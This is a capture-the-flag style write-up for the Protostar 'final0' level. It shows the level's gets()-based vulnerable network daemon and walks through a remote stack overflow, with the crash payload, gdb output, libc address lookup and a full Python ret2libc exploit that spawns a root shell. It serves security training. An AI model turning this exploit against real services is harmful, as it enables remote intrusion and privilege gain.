## FINAL ZERO ##
This level combines a stack overflow and network programming for a remote overflow.

Hints: depending on where you are returning to, you may wish to use a toupper() proof shellcode.

Core files will be in /tmp.

This level is at /opt/protostar/bin/final0

### Source Code ###
```C
#include "../common/common.c"

#define NAME "final0"
#define UID 0
#define GID 0
#define PORT 2995

/*
 * Read the username in from the network
 */

char *get_username()
{
  char buffer[512];
  char *q;
  int i;

  memset(buffer, 0, sizeof(buffer));
  gets(buffer);

  /* Strip off trailing new line characters */
  q = strchr(buffer, '\n');
  if(q) *q = 0;
  q = strchr(buffer, '\r');
  if(q) *q = 0;

  /* Convert to lower case */
  for(i = 0; i < strlen(buffer); i++) {
      buffer[i] = toupper(buffer[i]);
  }

  /* Duplicate the string and return it */
  return strdup(buffer);
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID);

  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  username = get_username();

  printf("No such user %s\n", username);
}
```
This task's goal is to run a shell script remotely by overflow the remote
machine's stack. We can exploit *gets* function to insert our exploited code.
First of all, let's send a long string to the remote machine. Notice that we
need to send a string with '\x00' or a NULL character in order to bypass toupper
function.
```
python -c 'print "a" * 511 + "\x00" +
"aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnoooopppp"' | nc
127.0.0.1 2995h
```
Then examine the core file in /tmp
```
gdb /opt/protostar/bin/final0 core.11.final0.3276

Core was generated by `/opt/protostar/bin/final0'.
Program received signal SIGSEGV, Segmentation fault.
[Switching to process 3276]
0x66666666 in ?? ()
(gdb) info registers
eax            0x804b008        134524936
ecx            0x0      0
edx            0x0      0
ebx            0x64646464       1684300900
esp            0xbffff7a0       0xbffff7a0
ebp            0x65656565       0x65656565
esi            0x0      0
edi            0x0      0
eip            0x66666666       0x66666666
eflags         0x210282 [ SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51

```
or we can just attach to the process and follow the child
```
gdb -p `pidof final0`

(gdb) set follow-fork-mode child
```
and then send the above message in another terminal, we will see

```
(gdb) set follow-fork-mode child
Current language:  auto
The current source language is "auto; currently asm".
(gdb) c
Continuing.
[New process 3276]

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 3276]
0x66666666 in ?? ()
(gdb) info registers
eax            0x804b008        134524936
ecx            0x0      0
edx            0x0      0
ebx            0x64646464       1684300900
esp            0xbffff7a0       0xbffff7a0
ebp            0x65656565       0x65656565
esi            0x0      0
edi            0x0      0
eip            0x66666666       0x66666666
eflags         0x210282 [ SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51

```
At this point, we know where we should start insert our code (0x66666666 is
ffff). We need to insert now is an address to a *execve* function and supply
also parameters for this function which are a string "/bin/sh", NULL, NULL.
First of all, let's find the function *execve* in libc.
```
strings -a -t x /lib/libc.so.6 | grep "/bin/sh"
 11f3bf /bin/sh
```
This is the offset of the string "/bin/sh" from the base address of libc.
Therefore, we also need to find the base address of libc.
```
root@protostar:/tmp# pidof final0                                             
2804                                                                          
root@protostar:/tmp# cat /proc/2804/maps                                      
08048000-0804a000 r-xp 00000000 00:10 2236       /opt/protostar/bin/final0
0804a000-0804b000 rwxp 00001000 00:10 2236       /opt/protostar/bin/final0
b7e96000-b7e97000 rwxp 00000000 00:00 0  
b7e97000-b7fd5000 r-xp 00000000 00:10 759        /lib/libc-2.11.2.so
b7fd5000-b7fd6000 ---p 0013e000 00:10 759        /lib/libc-2.11.2.so
b7fd6000-b7fd8000 r-xp 0013e000 00:10 759        /lib/libc-2.11.2.so
b7fd8000-b7fd9000 rwxp 00140000 00:10 759        /lib/libc-2.11.2.so
b7fd9000-b7fdc000 rwxp 00000000 00:00 0  
b7fe0000-b7fe2000 rwxp 00000000 00:00 0  
b7fe2000-b7fe3000 r-xp 00000000 00:00 0          [vdso]
b7fe3000-b7ffe000 r-xp 00000000 00:10 741        /lib/ld-2.11.2.so
b7ffe000-b7fff000 r-xp 0001a000 00:10 741        /lib/ld-2.11.2.so
b7fff000-b8000000 rwxp 0001b000 00:10 741        /lib/ld-2.11.2.so
bffeb000-c0000000 rwxp 00000000 00:00 0          [stack]
```
Now we can write a python script to send our message containing instructions to
execute a shell code.
```python
import struct
import socket
import telnetlib

HOST = '127.0.0.1'
PORT = 2995

padding = "a" * 511 + "\x00" + "aaaabbbbccccddddeeee"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

execve = struct.pack("I", 0x08048c0c)
sh_str = struct.pack("I", 0x11f3bf + 0xb7e97000)
ret_addr = "AAAA" # any random
argv_str = "\x00" * 4
envp_str = "\x00" * 4
exploit = padding + execve + ret_addr  +  sh_str + argv_str + envp_str 

s.send(exploit + "\n")
t = telnetlib.Telnet()
t.sock = s
t.interact()
```
and the result
```
whoami
root

```
